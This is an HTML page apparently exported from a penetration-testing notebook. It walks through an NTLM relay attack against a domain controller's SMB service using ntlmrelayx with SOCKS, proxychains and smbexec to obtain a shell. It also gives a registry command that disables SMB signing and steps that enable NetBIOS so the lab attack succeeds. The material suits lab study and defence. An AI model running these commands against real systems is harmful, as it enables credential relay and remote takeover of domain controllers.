<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Target SMB service (and connection with proxychains)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Target SMB service (and connection with proxychains)</h1><br /><br />
    <div class="codebox">
      <div class="codebox">
        kali@kali:$&nbsp;cd&nbsp;/usr/share/doc/python3-impacket/examples<br />kali@kali:$&nbsp;python3&nbsp;ntlmrelayx.py&nbsp;-6&nbsp;-wh&nbsp;attackerFox.daniele.local&nbsp;--target&nbsp;smb://&lt;IpDomainController&gt;&nbsp;&nbsp;--lootdir&nbsp;lootme&nbsp;-socks
      </div>
    </div><br />OPTIONS:<br /> ◇ <a href=""><img src="images/1257-1.png" alt="images/1257-1.png" /></a><br /> ◇ <a
      href=""><img src="images/1257-2.png" alt="images/1257-2.png" /></a><br /> ◇ <a href=""><img
        src="images/1257-3.png" alt="images/1257-3.png" /></a><br /> With the SOCKS option the authenticated sessions
    will be hold active, so it can later on be used and reused through a SOCKS proxy.<br /> This will allow us to
    connect with the shell of the target(only possible with the SMB service)<br /><br />OUTPUT:<br /><a href=""><img
        src="images/1257-4.png" alt="images/1257-4.png" /></a><br />1. This means that we have a socks proxy<br />
    <div class="codebox">
      <div class="codebox">socks</div>
    </div><br /> <a href=""><img src="images/1257-5.png" alt="images/1257-5.png" /></a><br /> <br /><br />Now we have to
    connect with this SOCKS!<br />2. edit proxychains.conf<br />
    <div class="codebox">
      <div class="codebox">mousepad&nbsp;/etc/proxychains.conf</div>
    </div><br /> <a href=""><img src="images/1257-6.png" alt="images/1257-6.png" /></a><br /><br />3. Use smbexec.py to
    connect<br />
    <div class="codebox">
      <div class="codebox">
        proxychains&nbsp;python3&nbsp;smbexec.py&nbsp;daniele/pparker@&lt;IpDomainController&gt;&nbsp;-no-pass</div>
    </div><br /> <a href=""><img src="images/1257-7.png" alt="images/1257-7.png" /></a><br /> ◇ <span
      style="color:#ff0000;">possible error: STATUS ACCESS DENIED</span><br /> <a href=""><img src="images/1257-8.png"
        alt="images/1257-8.png" /></a><br /> If we have as output STATUS_ACCESS_DENIED is because &quot;SMB
    signing&quot; is enabled (as we will seen in <a
      href="t_Methodology--Network_Pentest--Sniffing-Spoofing-Poisoning--NetNTLM_attacks--How_Increase_security_against--NTLM_relay_attacks_using_SMB.html">Increase
      Security</a> chapter). Good for the company :)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;reg&nbsp;query&nbsp;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters&nbsp;/v&nbsp;RequireSecuritySignature<br />PS&gt;&nbsp;reg&nbsp;add&nbsp;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters&nbsp;/v&nbsp;RequireSecuritySignature&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;0&nbsp;/f
      </div>
    </div><br /> <a href=""><img src="images/1257-9.png" alt="images/1257-9.png" /></a><br /> <a href=""><img
        src="images/1257-10.png" alt="images/1257-10.png" /></a><br /> After the change the DC need a restart<br /> ◇
    <span style="color:#ff0000;">possible error: NETBIOS connection with the remote host timed out</span><br /> <a
      href=""><img src="images/1257-11.png" alt="images/1257-11.png" /></a><br /> This happen because NETBIOS is not
    enabled over TCP/IP (IPv4)! Good for the company :)<br /> To enable it:<br /> Control Panel\Network and
    Internet\Network Connections → properties(right click) → Internet Protocol Version 4 (TCP/IPv4) → Advanced → WINS →
    Enable NetBIOS over TCP/IP<br /> <a href=""><img src="images/1257-12.png" alt="images/1257-12.png" /></a><br />
    <br /> <br /><br /><br /><br />Bibliography:<br /><a
      href="https://www.secureauth.com/blog/playing-with-relayed-credentials/" target="_blank">https://www.secureauth.com/blog/playing-with-relayed-credentials/</a>
  </div>
</body>

</html>